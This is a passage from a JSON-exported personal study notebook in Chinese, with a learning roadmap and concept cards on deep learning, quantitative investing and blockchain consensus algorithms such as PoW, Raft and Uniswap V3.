回测流程- 参数优化- 过拟合防范- 实盘迁移- 回测分析报告⭐⭐⭐⭐⭐高级模型量化第四阶段：高级9回测与优化🔄 进行中6周4周+- LSTM时序预测- Transformer- 强化学习- 因子挖掘AI- 深度学习量化模型⭐⭐⭐⭐\n深度学习路线\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n模块名称领域阶段顺序前置依赖状态预估时长实际时长包含内容输出产物优先级深度学习基础深度学习第一阶段：基础1-✅ 已完成2周2周- 神经网络原理- 反向传播- 激活函数- 损失函数- 手写神经网络⭐⭐⭐⭐⭐PyTorch框架深度学习第一阶段：基础2深度学习基础✅ 已完成2周2周- Tensor操作- Autograd- nn.Module- DataLoader- PyTorch工具库⭐⭐⭐⭐⭐RNN与LSTM深度学习第二阶段：进阶3PyTorch框架✅ 已完成2周2周- RNN原理- 梯度消失- LSTM结构- GRU变体- LSTM时序预测模型⭐⭐⭐⭐⭐时序数据处理深度学习第二阶段：进阶4RNN与LSTM✅ 已完成1周1周- 滑动窗口- 序列填充- 归一化- 数据增强- 时序数据预处理Pipeline⭐⭐⭐⭐⭐模型训练优化深度学习第二阶段：进阶5时序数据处理✅ 已完成2周2周- 学习率调度- 正则化- 早停法- 梯度裁剪- 训练优化工具包⭐⭐⭐⭐实战项目深度学习第三阶段：实战6模型训练优化✅ 已完成3周3周+- 股价预测- 量化因子挖掘- 模型部署- 性能监控- 端到端预测系统⭐⭐⭐⭐⭐Transformer深度学习第四阶段：高级7实战项目⏳ 计划中3周-- 注意力机制- Encoder-Decoder- GPT架构- BERT架构- Transformer实现⭐⭐⭐⭐图神经网络深度学习第四阶段：高级8Transformer⏳ 计划中3周-- 图结构基础- GCN/GAT- 图池化- 应用场景- GNN因子挖掘模型⭐⭐⭐\n学习进度统计\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n领域已完成进行中计划中未解锁总进度区块链3/1016030%量化8/910089%深度学习6/802075%"},"🧠_知识点卡片.base":{"slug":"🧠_知识点卡片.base","filePath":"🧠_知识点卡片.base.md","title":"🧠_知识点卡片.base","links":[],"tags":[],"content":"区块链核心概念\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n概念名称领域难度状态一句话解释核心要点相关文章前置知识标签纠删码区块链⭐⭐⭐✅ 已掌握分布式存储中的数据冗余与恢复技术- 通过校验块实现数据恢复- 原理：m个数据块生成n个校验块- 容错：任意m个块可恢复原始数据纠删码.md线性代数基础概念,架构POW区块链⭐⭐⭐⭐✅ 已掌握工作量证明：通过计算竞争记账权- 算力竞争决定记账权- 51%攻击风险- 能源消耗问题死磕共识算法_pow算法哈希函数算法,理论POS区块链⭐⭐⭐⭐✅ 已掌握权益证明：按持币数量和时间竞争记账权- 克服POW能耗问题- 币龄概念- Nothing at Stake攻击死磕共识算法_POS算法POW算法,理论DPOS区块链⭐⭐⭐✅ 已掌握委托权益证明：代币持票投票选出超级节点- EOS采用- 高吞吐量- 中心化风险死磕共识算法_DPOS算法POS算法,架构Paxos区块链⭐⭐⭐⭐✅ 已掌握分布式一致性算法：提案-承诺-接受- Basic Paxos流程- Multi Paxos优化- 活锁问题死磕共识算法_Paxos算法分布式系统算法,理论Raft区块链⭐⭐⭐⭐✅ 已掌握易于理解的一致性算法：领导者选举+日志复制- Leader/Follower/Candidate角色- 心跳机制- 选举超时随机化死磕共识算法_Raft算法分布式系统算法,理论拜占庭将军问题区块链⭐⭐⭐⭐⭐✅ 已掌握分布式系统在恶意节点存在时的一致性问题- 叛徒节点模拟- 3m+1节点容忍m个叛徒- PBFT实用解决方案死磕共识算法_拜占庭将军问题-理论Uniswap V3区块链⭐⭐⭐⭐⭐🔄 学习中集中流动性的自动做市商协议- Concentrated Liquidity- Fee Tiers- Range Orders- Non-fungible LP Positions死磕 uniswap -v3.mdAMM,以太坊实战,架构\n量化核心概念\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n概念名称领域难度状态一句话解释核心要点相关文章前置知识标签Horizon对齐量化⭐⭐⭐✅ 已掌握时序预测中标签与特征的时间对齐方式- Point-in-time避免未来函数- 多种Horizon模式- 量化评估基准horizon对齐详解时序数据理论横截面标准化量化⭐⭐⭐⭐✅ 已掌握去除行业和市值因子，比较相对强弱- Z-Score标准化- 行业中性化- 市值中性化横截面标准化与中性化.md统计学理论,算法相对强弱预测量化⭐⭐⭐✅ 已掌握预测股票相对其他股票的表现排名- RankIC评估- 不是预测涨跌- 适合组合投资相对强弱预测的量化思维.md-理论Gradient Boosting量化⭐⭐⭐⭐✅ 已掌握迭代添加弱学习器纠正前序错误- 残差拟合思想- Gradient下降方向- XGBoost/LightGBMGradient-Boosting原理.md决策树算法,理论时序数据划分量化⭐⭐⭐✅ 已掌握按时间划分训练/验证/测试集- 严格的时序分割- 滚动窗口验证- 避免窥探未来时序数据划分.md-理论IC/RankIC量化⭐⭐⭐⭐✅ 已掌握预测值与真实值的相关系数评估- IC：线性相关- RankIC：排序相关- 正态性影响IC-Rank-IC评估指标.md相关系数理论,算法特征重要性量化⭐⭐⭐⭐✅ 已掌握评估各特征对模型预测的贡献度- Gain importance- Permutation importance- SHAP值特征重要性分析.md机器学习算法,理论投资组合构建量化⭐⭐⭐⭐✅ 已掌握将预测结果转化为实际持仓组合- 等权/市值加权- 风险平价- 优化器方法投资组合构建方法.md-理论,实战成本模型量化⭐⭐⭐⭐✅ 已掌握交易成本对策略收益的侵蚀建模- 固定成本+可变成本- 市场冲击模型- 滑点估算Executor与成本模型.md-理论\n深度学习核心概念\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n概念名称领域难度状态一句话解释核心要点相关文章前置知识标签LSTM深度学习⭐⭐⭐⭐🔄 学习中长短期记忆网络，解决RNN梯度消失问题- Cell State + Hidden State- 遗忘门/输入门/输出门- 梯度长距离传播LSTM模型构建系列RNN算法,理论时序数据预处理深度学习⭐⭐⭐🔄 学习中将原始时序数据转换为模型可输入格式- 归一化/标准化- 滑动窗口构造- 序列填充/截断时序数据处理系列-实战,工具PyTorch深度学习⭐⭐⭐✅ 已掌握动态计算图的深度学习框架- Tensor操作- Autograd自动求导- nn.Module模块化PyTorch框架系列Python工具,实战\n待添加概念\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n概念名称领域难度状态一句话解释核心要点相关文章前置知识标签Layer2区块链⭐⭐⭐⭐⏳ 待学习以太坊二层扩容方案总称- Rollup技术- Optimistic/ZK区别- 逃逸窗口期-以太坊理论,架构跨链区块链⭐⭐⭐⭐⭐⏳ 待学习不同区块链之间的资产和信息互通- 哈希时间锁定合约- 中继链模式- 侧链/平行链-共识机制理论,架构隐私计算区块链⭐⭐⭐⭐⭐⏳ 待学习在保护数据隐私前提下进行计算- 零知识证明- 安全多方计算- 同态加密-密码学理论,算法注意力机制深度学习⭐⭐⭐⭐⏳ 待学习模型关注输入序列的重要部分- Q/K/V计算- Self-Attention- Multi-Head-深度学习算法,理论Transformer深度学习⭐⭐⭐⭐⭐⏳ 待学习基于注意力机制的序列模型架构- Encoder-Decoder- Positional Encoding- 并行计算-注意力机制算法,架构"}}